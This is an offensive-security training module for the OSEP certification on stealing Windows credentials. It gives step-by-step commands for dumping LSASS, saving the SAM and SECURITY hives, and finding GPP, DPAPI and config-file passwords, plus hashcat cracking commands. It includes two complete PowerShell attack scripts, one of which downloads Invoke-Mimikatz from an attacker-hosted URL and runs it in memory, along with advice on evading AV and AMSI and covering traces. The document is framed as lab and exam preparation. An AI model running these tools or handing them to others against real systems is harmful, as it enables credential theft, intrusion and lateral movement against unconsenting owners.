::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# 07 · Credentials: LSASS / LSA / SAM and alternate sources (scenario 46)

> Aligned with: (`Mimikatz` `LSA Protection Bypass` `MiniDump` `Invoke-Mimikatz` `Cracking Hashes`)
>
> Scenario basis: `scenarios.md` scenario 46.
>
> Lab files: `m07-invoke-mimikatz-reflect.ps1`, `m07-credential-sources.ps1`

## Module goals

The core judgment for scenario 46: **LSASS access failing ≠ no usable identity**. In similar course situations you can still get another useful identity from
LSA Secrets, SAM, or application configs. So this module’s prep focus is:

1. Decide what is blocking LSASS (LSA Protection / Credential Guard / AV-EDR hooks / insufficient rights),
   and which cases are **worth trying** LSASS contact versus which should be abandoned immediately.
2. Build a “credential source × required rights × collection command” lookup table, and try alternates in order.
3. Prepare multiple **load shapes** for tools (mimikatz / Invoke-Mimikatz / dump utilities) so “tool lands and gets killed” does not become a second roadblock.

Invariant: **do not assume you can bypass LSASS protection**. Choose a method only after you know the protection type and your rights;
for RunAsPPL / Credential Guard, the alternate-source path in the material is almost always faster.

---

## Scenario 46: Credential tools blocked, and LSASS itself is protected

### Situation

- You already have **high local rights** (admin or SYSTEM), but LSASS access fails (read denied / tool killed / injection fails).
- Goal: obtain **another usable identity** from the host (local or domain user cleartext / hash / ticket / DPAPI material).
- Reference path: confirm LSASS protection shape first → try alternate sources by category (LSA Secrets, SAM, DPAPI,
  registry, config files, GPP, scheduled tasks) → only then evaluate whether contacting LSASS is necessary and feasible.

### Assumptions

- You already have a high-local-rights session (can `reg save` / read `HKLM\SECURITY`, `HKLM\SAM`, or run tools as SYSTEM).
- Fallback when the assumption fails: if you are low-priv with no priv-esc path, this scenario does not apply — enumerate locally first,
  follow M06 / M12 priv-esc and lateral paths; do not waste time slamming LSASS.
- Assume AV/EDR may block at process create, `OpenProcess`, `.dll` on disk, and AMSI (scenario 19 behavioral ideas still apply).

### Prepare (attacker)

- Static tools: `mimikatz.exe` (x64/x86), `procdump.exe`, drivers related to `sekurlsa` (usually do not land on disk).
- In-memory shape: `Invoke-Mimikatz.ps1` (PowerSploit) plus a reflective load entry — see
  `m07-invoke-mimikatz-reflect.ps1` (includes a comsvcs MiniDump option; no downloader required).
- Source checklist script: `m07-credential-sources.ps1` (by source + required rights + one-shot collection).
- Offline parse box: attacker host with mimikatz / secretsdump / hashcat (copy dumps or hives back for analysis).
- Target-side quick checks (see the environment before landing anything):

```powershell
# Current rights and SeDebugPrivilege
whoami /priv
# Whether LSASS is RunAsPPL-protected (0 = off; 2 = signed + PPL start)
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags   # non-zero hints Credential Guard related
# LSASS process (PID / integrity)
Get-Process lsass | Select-Object Id, Name
# Minimal contact probe: “access denied” vs “process protected”
tasklist /FI "IMAGENAME eq lsass.exe"
```

### Procedure

**Step 0 · Classify (decide whether to touch LSASS)**

1. `whoami /priv` has no `SeDebugPrivilege` (and not SYSTEM) → cannot dump normally; jump straight to step 2 alternate sources.
2. `RunAsPPL` value is 2 → LSA Protection on; `LsaCfgFlags` non-zero → Credential Guard direction.
   Neither is a “one command bypass” setting; **default: abandon direct LSASS reads**, go to alternate sources.
3. No protection flags but still failing (killed / errors) → usually AV/EDR: change load shape (step 1 C/D), not dump posture.

**Step 1 · Contact LSASS only when there is no PPL/Credential Guard (shape options)**

- A. Normal in-memory: land mimikatz PE, or `Invoke-Mimikatz -Command '"sekurlsa::logonpasswords" "exit"'`
  (load the function into memory first; see the reflective script shape).
- B. Built-in dump + offline parse (least noisy, most stable):
  `rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\ls.dmp full`
  or `procdump -ma <LSASS_PID> ls.dmp`; copy back and parse offline with mimikatz `sekurlsa::minidump ls.dmp`.
- C. .NET assembly load (avoid landed EXE and some process-create detections): treat mimikatz as an assembly via
  `Assembly.Load` + reflective entry (use `-Mode Assembly` placeholder in `m07-invoke-mimikatz-reflect.ps1`).
- D. Command-line obfuscation / encoded calls (AMSI static features); remember scenario 18: encode/encrypt before delivery.

> Artifact list: `sekurlsa::logonpasswords` (interactive logon cache cleartext/NTLM), `sekurlsa::wdigest`,
>
> `sekurlsa::kerberos` (tickets), `sekurlsa::msv` (msv1_0 cache).

**Step 2 · Alternate sources (highest rights first; prefer what only SYSTEM can read)**

Use `m07-credential-sources.ps1` for one-shot collection, or follow the lookup table by hand:

| Source | Contents | Rights needed | Key commands / locations |
|---|---|---|---|
| LSA Secrets | `DefaultPassword`, service account passwords, DPAPI machine keys | SYSTEM | `reg save HKLM\SECURITY sec.hive` → secretsdump / mimikatz `lsadump::secrets` |
| SAM | Local account NTLM hashes | SYSTEM | `reg save HKLM\SAM sam.hive` + `HKLM\SYSTEM sys.hive` → `secretsdump -sam -system` |
| Registry Winlogon/AutoLogon | Cleartext password | Admin | `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` |
| Cached domain logons | Domain credential cache (DCC2) | SYSTEM | `lsadump::cache` (offline crack needs DCC2) |
| DPAPI | User master keys + app passwords (browser/Outlook/vault) | Matching user | User profile `AppData\Roaming\Microsoft\Protect` + decrypt in that context |
| WDigest | Cleartext (on by default on older systems) | SYSTEM | `sekurlsa::wdigest` |
| Config files | Hardcoded passwords in deploy/scripts | Read rights enough | Full-disk search: `unattend.xml`, `web.config`, `*.config`, `*.ps1`/`*.bat`/`*.xml` |
| GPP | Domain Group Policy Preferences passwords | Read SYSVOL (domain user enough) | `SYSVOL\...\Policies\*\MACHINE\Preferences\Groups\Groups.xml` `cPassword` |
| Scheduled tasks | Creds/scripts referenced by task actions | Admin read of registry | `schtasks /query /fo LIST /v` + `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache` |

**Step 3 · Offline cracking (can be done back on the attacker box)**

```bash
# NTLM (SAM / LSA Secrets / sekurlsa artifacts)
hashcat -m 1000 ntlm.txt wordlist.txt
# NetNTLMv2 (if you later capture relay hashes — m16 / other scenario artifacts)
hashcat -m 5600 netntlmv2.txt wordlist.txt
# DCC2 (cached domain credentials)
hashcat -m 2100 dcc2.txt wordlist.txt
# After cleartext/hash: see M15 (WinRM hash/cleartext), M12 (PTT / over-pass-the-hash tickets)
```

### Lab files

- `m07-invoke-mimikatz-reflect.ps1` — load-shape options when LSASS is unprotected
  (reflective invoke / comsvcs MiniDump / assembly placeholder) plus RunAsPPL and rights pre-checks.
- `m07-credential-sources.ps1` — one-shot alternate-source collection (by source + required rights).
- Both are “take what you need”, not auto-fire everything: read the output before choosing the next step.

### Verify

- Classification matches reality: with PPL on, expect `OpenProcess`/dump denied; without protection, dump produces a non-empty file.
- SAM/LSA Secrets: on the attacker box, `secretsdump -sam sam.hive -system sys.hive LOCAL` (or mimikatz on the hive
  `lsadump::sam /system:sys.hive`) lists hashes; pick one NTLM and authenticate once laterally (M15) to close the loop.
- Account passwords from LSA Secrets: `net use \\TARGET\IPC$ /user:DOMAIN\USER PASS` or WinRM login.
- DPAPI/config/GPP: cleartext authenticates directly; decrypt GPP `cPassword` with `gpp-decrypt` first.

### If it fails

1. **LSASS completely unreadable (PPL/Credential Guard) and alternate sources empty**: do not linger. Convert session capability into lateral/enum
   (M12/M15), repeat the source list on another host; this module’s goal is “another identity”, not “must get LSASS”.
2. **Dump succeeds but offline parse is empty**: match `sekurlsa::minidump` / mimikatz versions to the OS (newer hosts need newer mimikatz);
   or check you did not dump the wrong process / wrong PID (use x64 tools on 64-bit hosts).
3. **Tool lands and gets killed / process create blocked**: use comsvcs `MiniDump` or .NET reflective shape; avoid writing mimikatz.exe on target.
4. **SAM has no local accounts / LSA Secrets has no reusable passwords**: return to config/scheduled-task/GPP search; in domain environments prioritize GPP and
   leftover domain creds in tasks.
5. **Hash is empty password or already invalid**: verification must “authenticate once for real”; do not keep cracking hashes that cannot authenticate.

### Exam notes / OPSEC

- **Do not repeatedly try dumps on hosts with LSA Protection / Credential Guard**: high noise, high fail rate, and EDR alerts.
  Classify first (~30s); if unsuitable, switch to alternate sources.
- `reg save` / large file copies leave clear traces: keep dumps and hives under system or already-whitelisted dirs; copy off and clean ASAP.
- mimikatz and `Invoke-Mimikatz` are strong static signatures: prefer in-memory load; encode/encrypt before delivery when needed (scenario 18).
- **Authenticate once for real** with the identity you got, but be careful under lockout policies (many bad domain password tries) —
  prefer pass-the-hash (does not hit password policy) over guessing cleartext blindly.
- Record rights required per source so you do not run blind outside SYSTEM context (lab scripts already annotate required rights).

---

#### `m07-invoke-mimikatz-reflect.ps1` {#m07-invoke-mimikatz-reflect-ps1}

````powershell
<#
Purpose: Credential collection when LSASS has no strong protection — load Invoke-Mimikatz in memory (no on-disk ps1/exe) or fall back to comsvcs MiniDump
Scenario: 46 (classify first: this script only handles the “confirmed LSASS is touchable” branch; if PPL/Credential Guard is on, abandon per module guidance and use m07-credential-sources.ps1)
Depends: PowerShell 3.0+; Invoke mode needs a readable Invoke-Mimikatz.ps1 (local file or HTTP source);
         MiniDump mode needs SeDebugPrivilege (admin/SYSTEM); both are denied under RunAsPPL>=2 or Credential Guard
Usage: powershell -ep bypass -f m07-invoke-mimikatz-reflect.ps1 -Mode Invoke -SourceFile C:\Windows\Temp\Invoke-Mimikatz.ps1 -Command '"sekurlsa::logonpasswords" "exit"'
       Remote source: ... -Mode Invoke -SourceUrl http://LHOST/Invoke-Mimikatz.ps1
       Dump mode: ... -Mode MiniDump -LsassPid 1234 -DumpDir C:\Windows\Temp
       Force ignore classification (generally not recommended): ... -Force
Placeholders: LHOST=attacker IP hosting Invoke-Mimikatz.ps1; SourceFile/SourceUrl choose one
Test status: Not run on Windows (host is macOS); syntax checked by hand. If AMSI blocks this script/delivered content, handle per scenarios 18/19 (encode/encrypt, host match) before redelivery
#>
[CmdletBinding()]
param(
    [ValidateSet('Invoke', 'MiniDump')][string]$Mode = 'Invoke',
    [string]$Command = '"sekurlsa::logonpasswords" "exit"',
    [string]$SourceFile = '',
    [string]$SourceUrl = '',
    [int]$LsassPid = 0,
    [string]$DumpDir = "$env:WINDIR\Temp",
    [switch]$Force
)

function Section($t) { Write-Output ""; Write-Output ("=" * 12 + " $t " + "=" * 12) }
function Test-Admin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $p = New-Object Security.Principal.WindowsPrincipal($id)
    return ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -or $id.IsSystem)
}
function Get-LsaProtectionStatus {
    # RunAsPPL: 0=off; 1=signature required; 2=signature+PPL start (normal dump blocked). Non-zero LsaCfgFlags hints Credential Guard direction.
    $out = [pscustomobject]@{ RunAsPPL = 0; LsaCfgFlags = 0 }
    try {
        $l = (& reg.exe query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL 2>$null)
        if ($l -match '0x([0-9a-fA-F]+)') { $out.RunAsPPL = [Convert]::ToInt32($Matches[1], 16) }
        $c = (& reg.exe query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags 2>$null)
        if ($c -match '0x([0-9a-fA-F]+)') { $out.LsaCfgFlags = [Convert]::ToInt32($Matches[1], 16) }
    } catch { }
    return $out
}
function Enable-SeDebugPrivilege {
    # Enable SeDebugPrivilege for the current process (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY)
    if (-not ('M07Priv.Native' -as [type])) {
        Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
namespace M07Priv {
    [StructLayout(LayoutKind.Sequential)]
    public struct LuidAttr { public long Luid; public uint Attributes; }
    [StructLayout(LayoutKind.Sequential)]
    public struct TokenPrivileges { public uint PrivilegeCount; public LuidAttr Privilege; }
    public static class Native {
        [DllImport("advapi32.dll", SetLastError=true)] public static extern bool OpenProcessToken(IntPtr h, uint a, out IntPtr t);
        [DllImport("advapi32.dll", SetLastError=true)] public static extern bool LookupPrivilegeValue(string s, string n, out long l);
        [DllImport("advapi32.dll", SetLastError=true)] public static extern bool AdjustTokenPrivileges(IntPtr t, bool d, ref TokenPrivileges n, uint b, IntPtr p, IntPtr r);
    }
}
'@
    }
    $h = [IntPtr]::Zero
    $proc = [System.Diagnostics.Process]::GetCurrentProcess()
    if (-not [M07Priv.Native]::OpenProcessToken($proc.Handle, 0x28, [ref]$h)) { return $false }
    $luid = [long]0
    if (-not [M07Priv.Native]::LookupPrivilegeValue($null, 'SeDebugPrivilege', [ref]$luid)) { return $false }
    $tp = New-Object M07Priv.TokenPrivileges
    $tp.PrivilegeCount = 1; $tp.Privilege.Luid = $luid; $tp.Privilege.Attributes = 0x2  # SE_PRIVILEGE_ENABLED
    $ok = [M07Priv.Native]::AdjustTokenPrivileges($h, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero)
    return $ok
}

Section "Classify (decide whether LSASS is worth touching)"
if (-not (Test-Admin)) {
    Write-Output "[-] Not admin/SYSTEM: cannot read LSASS normally. Prefer m07-credential-sources.ps1 for alternate sources."
    if (-not $Force) { exit 1 }
}
$priv = Enable-SeDebugPrivilege
Write-Output ("[+] SeDebugPrivilege available (enable attempted): {0}" -f $priv)
$prot = Get-LsaProtectionStatus
Write-Output ("[+] LSA protection: RunAsPPL={0} LsaCfgFlags={1} (>=2 means normal dump is denied)" -f $prot.RunAsPPL, $prot.LsaCfgFlags)
if (($prot.RunAsPPL -ge 2 -or $prot.LsaCfgFlags -ne 0) -and -not $Force) {
    Write-Output "[-] LSASS protected by LSA Protection / Credential Guard: per module guidance do not assume a bypass — switch to m07-credential-sources.ps1 (SAM/LSA Secrets/registry/DPAPI/config/GPP/scheduled tasks)."
    exit 2
}

if ($Mode -eq 'Invoke') {
    Section "Invoke-Mimikatz (in-memory reflection, no disk)"
    $src = ''
    if ($SourceFile -ne '') { $src = Get-Content -Raw -LiteralPath $SourceFile -ErrorAction Stop }
    elseif ($SourceUrl -ne '') {
        Write-Output "[*] Pulling from $SourceUrl (proxy/egress: see docs/09)..."
        $src = (New-Object System.Net.WebClient).DownloadString($SourceUrl)
    } else { Write-Output "[-] Invoke mode needs -SourceFile or -SourceUrl (Invoke-Mimikatz.ps1 is too large to embed)"; exit 3 }
    Invoke-Expression $src
    if (-not (Get-Command Invoke-Mimikatz -ErrorAction SilentlyContinue)) {
        Write-Output "[-] Function Invoke-Mimikatz failed to load (AMSI/language mode may have blocked it — retry after scenarios 18/19)"; exit 4
    }
    Write-Output "[*] Running: $Command"
    & (Get-Command Invoke-Mimikatz) -Command $Command
    Write-Output "[*] Done. If output includes logonpasswords cache, authenticate for real with that identity (M15/M12)."
}
else {
    Section "MiniDump (comsvcs.dll, parse offline)"
    $ls = if ($LsassPid -gt 0) { Get-Process -Id $LsassPid -ErrorAction Stop } else { Get-Process lsass -ErrorAction Stop }
    $stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
    $out = Join-Path $DumpDir ("lsass_{0}_{1}.dmp" -f $ls.Id, $stamp)
    Write-Output "[*] dump LSASS PID=$($ls.Id) -> $out"
    # Direct rundll32 comsvcs MiniDump; under PPL the process fails / file is empty — expected (see classify)
    & rundll32.exe "$env:WINDIR\System32\comsvcs.dll, MiniDump" $ls.Id $out "full"
    Start-Sleep -Seconds 2
    if ((Test-Path $out) -and ((Get-Item $out).Length -gt 0)) {
        Write-Output "[+] dump OK: $out ($((Get-Item $out).Length) bytes)"
        Write-Output "[*] Copy back for offline parse: mimikatz.exe `"sekurlsa::minidump $out`" `"sekurlsa::logonpasswords`" `"exit`""
    } else {
        Write-Output "[-] dump failed/empty: confirm SeDebugPrivilege, PPL off, correct PID; or switch to -Mode Invoke"
    }
}
````

#### `m07-credential-sources.ps1` {#m07-credential-sources-ps1}

````powershell
<#
Purpose: Collect Windows credential material by source (SAM / LSA Secrets / registry AutoLogon / cached logons / DPAPI / config files / scheduled tasks / GPP), annotate required rights and artifacts for offline parse
Scenario: 46 — when LSASS is protected or credential tools are blocked, switch to alternate sources; after high rights (especially SYSTEM), sweep host identity material once
Depends: Admin covers most; SAM, LSA Secrets, cached logons need SYSTEM; DPAPI needs matching user session; GPP needs domain identity with SYSVOL reachability
Usage: powershell -ep bypass -f m07-credential-sources.ps1 -WorkDir C:\Windows\Temp
       Max coverage (recommended): run as SYSTEM (PsExec -s / schtasks /create /ru SYSTEM /run — see M06/M27 ideas)
       GPP search needs domain: ... -Domain corp.local
Placeholders: DOMAIN=target domain FQDN (SYSVOL path); WorkDir=artifact directory (must be writable; prefer system dirs)
Test status: Not run on Windows (host is macOS); syntax checked by hand. Take reg-save hives and Groups.xml back to the attacker box for offline parse — do not crack on the target
#>
[CmdletBinding()]
param(
    [string]$WorkDir = "$env:WINDIR\Temp\m07creds",
    [string]$Domain = '',          # e.g. corp.local; non-empty enables GPP (SYSVOL) search
    [switch]$SkipConfigScan        # full-disk-ish config scans are noisy; can skip
)

function Section($t) { Write-Output ""; Write-Output ("=" * 12 + " $t " + "=" * 12) }
function Try-Run($label, [scriptblock]$block) {
    try { Write-Output ("[+] {0}: {1}" -f $label, (& $block)) }
    catch { Write-Output ("[-] {0}: {1}" -f $label, $_.Exception.Message) }
}
function Test-Admin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $p = New-Object Security.Principal.WindowsPrincipal($id)
    return ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -or $id.IsSystem)
}

New-Item -ItemType Directory -Force -Path $WorkDir | Out-Null
$Sys  = (whoami) -match 'nt authority\\system'
$Admin = Test-Admin
Write-Output "[*] Context: $(whoami) | Admin=$Admin | SYSTEM=$Sys | Artifact dir=$WorkDir"
Write-Output "[*] Rights legend: SYSTEM > Admin > current user > read-only enough. This script only collects; parse hive/Groups.xml offline on the attacker box."

Section "1. SAM (local account NTLM) — needs SYSTEM"
if ($Sys) {
    & reg.exe save HKLM\SAM "$WorkDir\sam.hive" /y *> $null
    & reg.exe save HKLM\SYSTEM "$WorkDir\sys.hive" /y *> $null
    if ((Test-Path "$WorkDir\sam.hive")) {
        Write-Output "[+] sam.hive/sys.hive saved. Offline: secretsdump -sam sam.hive -system sys.hive LOCAL (or mimikatz lsadump::sam /system:sys.hive)"
    } else { Write-Output "[-] reg save failed (needs SYSTEM + SeBackupPrivilege)" }
} else { Write-Output "[-] Not SYSTEM — skipped. Re-run this section after elevating to SYSTEM (PsExec -s / scheduled task / M06)" }

Section "2. LSA Secrets — needs SYSTEM (service account passwords / DPAPI machine keys)"
if ($Sys) {
    & reg.exe save HKLM\SECURITY "$WorkDir\sec.hive" /y *> $null
    if ((Test-Path "$WorkDir\sec.hive")) {
        Write-Output "[+] sec.hive saved. Offline: secretsdump -security sec.hive -system sys.hive LOCAL (or mimikatz lsadump::secrets /system:sys.hive)"
    } else { Write-Output "[-] reg save failed" }
} else { Write-Output "[-] Not SYSTEM — skipped (HKLM\SECURITY is unreadable even as admin)" }

Section "3. Registry AutoLogon/Winlogon (cleartext) — read rights / admin"
Try-Run "Winlogon AutoLogon values" {
    (& reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon 2>$null)
    (& reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName 2>$null)
    (& reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName 2>$null)
    $dp = (& reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword 2>$null)
    if ($dp) { $dp } else { "DefaultPassword not set (or unreadable)" }
}
Try-Run "Leftover registry password keys" {
    $keys = 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon','HKLM\SYSTEM\CurrentControlSet\Control\Lsa'
    $found = foreach ($k in $keys) { (& reg.exe query $k /s 2>$null) | Select-String -Pattern 'Password|Secret' }
    if ($found) { ($found | Select-Object -First 5).Line -join ' | ' } else { 'No obvious password keys found' }
}

Section "4. Cached domain logons — needs SYSTEM (DCC2 hashes)"
if ($Sys) {
    Try-Run "HKLM\SECURITY\Cache entries" {
        $n = (& reg.exe query "HKLM\SECURITY\Cache" 2>$null | Select-String -Pattern 'NL\$' ).Count
        "Cached entries ≈$n (offline: mimikatz lsadump::cache /system:sys.hive; crack with hashcat -m 2100)"
    }
} else { Write-Output "[-] Not SYSTEM — skipped" }

Section "5. DPAPI (master keys / credential files) — needs matching user session"
Try-Run "Current-user DPAPI" {
    $u = $env:USERPROFILE
    $roam = "$u\AppData\Roaming\Microsoft\Protect"; $loc = "$u\AppData\Local\Microsoft\Protect"
    $cred = "$u\AppData\Local\Microsoft\Credentials"; $vault = "$u\AppData\Local\Microsoft\Vault"
    $r = @()
    if (Test-Path $roam) { $r += "Roaming master keys x$((Get-ChildItem $roam -Recurse -File -EA SilentlyContinue).Count)" }
    if (Test-Path $loc)  { $r += "Local master keys x$((Get-ChildItem $loc -Recurse -File -EA SilentlyContinue).Count)" }
    if (Test-Path $cred) { $r += "Credentials files x$((Get-ChildItem $cred -Recurse -File -EA SilentlyContinue).Count)" }
    if (Test-Path $vault) { $r += "Vault directory present" }
    if ($r) { $r -join ' | ' } else { 'None (or current user has no DPAPI material)' }
}
Try-Run "Other user profiles (inventory only; decrypt needs that user)" {
    (Get-ChildItem C:\Users -Directory -EA SilentlyContinue | Where-Object { $_.Name -notin @('Public','Default','Default User','All Users') } | Select-Object -ExpandProperty Name) -join ', '
}

Section "6. Config-file leftover passwords — read rights enough"
if (-not $SkipConfigScan) {
    $dirs = 'C:\Windows\Panther','C:\Windows\System32\sysprep','C:\inetpub','C:\ProgramData','C:\Users\Public'
    $files = Get-ChildItem $dirs -Recurse -Include unattend*.xml,*.config,*.ps1,*.bat,*.cmd,*.vbs,*.xml,*.txt -File -EA SilentlyContinue |
             Where-Object { $_.Length -lt 2MB } | Select-Object -First 400
    $hits = $files | Select-String -Pattern 'password\s*[=:]\s*\S+|passwd\s*[=:]\s*\S+|<Password>|<Value>|pwd\s*=' -EA SilentlyContinue | Select-Object -First 15
    if ($hits) { ($hits | ForEach-Object { "{0}:{1}" -f $_.Path, $_.Line.Trim() }) -join "`n" }
    else { 'None found (manually widen dirs: site folders with web.config, user-home scripts)' }
} else { Write-Output '[-] Skipped per -SkipConfigScan' }

Section "7. Scripts/creds in scheduled-task actions — admin"
Try-Run "Scripts referenced by task actions" {
    $csv = (& schtasks.exe /query /fo csv /v 2>$null) | ConvertFrom-Csv
    $scripts = $csv | Where-Object { $_.'Task To Run' -match '\.(bat|cmd|ps1|vbs|js|exe) ' -and $_.'Task To Run' -notmatch '\\Windows\\' } |
               Select-Object -First 8
    if ($scripts) { ($scripts | ForEach-Object { "{0} -> {1} (RunAs:{2})" -f $_.TaskName, $_.'Task To Run', $_.'Run As User' }) -join "`n" }
    else { 'No non-system script-like task actions (still worth spot-checking TaskCache registry)' }
}

Section "8. GPP (SYSVOL Group Policy Preferences) — domain identity + read SYSVOL"
if ($Domain -ne '') {
    $pol = "\\$Domain\SYSVOL\$Domain\Policies"
    if (Test-Path $pol) {
        $g = Get-ChildItem $pol -Recurse -Filter Groups.xml -File -EA SilentlyContinue
        foreach ($f in $g) {
            $m = [regex]::Matches((Get-Content -Raw $f.FullName), 'userName="([^"]+)"[^>]*?cPassword="([^"]+)"')
            if ($m.Count) { Write-Output ("[+] {0}: {1}" -f $f.FullName, (($m | ForEach-Object { "$($_.Groups[1].Value):$($_.Groups[2].Value)" }) -join ', ')) }
        }
        Write-Output "[*] Decrypt listed cPassword offline with gpp-decrypt; also scan other .xml/.ini leftovers under SYSVOL"
    } else { Write-Output "[-] SYSVOL unreachable ($pol). Check: domain-joined host, current identity has domain rights, DNS is correct" }
} else { Write-Output "[-] No -Domain given; GPP skipped. Domain-joined hosts should re-run with it" }

Section "Done: artifacts and next steps"
Write-Output "[*] Hive files under $WorkDir:"
Get-ChildItem $WorkDir -File | ForEach-Object { "    $($_.Name) ($($_.Length) bytes)" }
Write-Output "[*] Priority: under SYSTEM, parse SAM/LSA Secrets first (often identities usable for lateral); without SYSTEM, check config/scheduled tasks/GPP first (read rights enough)"
Write-Output "[*] Authenticate once for real with parsed identities via M15 (WinRM cleartext/hash) or M12 (PTT/delegation) — do not stop at the hash string itself"
````

## Cheat sheet keyword map (quick reference)

| Keyword | Where it lands in this module |
|---|---|
| `Mimikatz` | In-memory / offline minidump parse when no PPL (step 1) |
| `LSA Protection Bypass` | Evaluate only, do not assume: classify via `RunAsPPL`; if PPL on, default to alternate sources |
| `MiniDump` | `rundll32 comsvcs.dll,MiniDump` / procdump + offline parse on attacker box |
| `Invoke-Mimikatz` | Reflective load script `m07-invoke-mimikatz-reflect.ps1` |
| `Cracking Hashes` | `hashcat -m 1000/2100/5600` (NTLM / DCC2 / NetNTLMv2) |

## Related modules

- After identity: lateral M15 (WinRM cleartext/hash), M12 (tickets / over-pass-the-hash / delegation).
- If local rights are insufficient: elevate first via M06; behavioral detection ideas: M05 scenario 19.
- Hash relay / capture scenarios (not the main path here): M16 / M11 (responder, SQL-triggered auth).
